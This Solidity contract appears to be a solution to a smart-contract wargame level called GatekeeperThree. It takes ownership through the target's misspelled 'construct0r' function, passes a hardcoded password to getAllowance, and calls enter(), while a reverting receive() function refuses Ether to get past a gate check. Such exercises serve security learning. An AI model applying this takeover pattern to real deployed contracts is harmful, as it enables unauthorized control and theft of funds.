// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "trick.sol";

contract Pwd {
    GatekeeperThree public target;
    SimpleTrick public trick;
    uint256 private password = 1742487480;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function pwd() public {
        target.construct0r();
        target.getAllowance(password);
        target.enter();
    }

    receive() external payable {
        revert("Cannot send Ether to this contract");
    }
}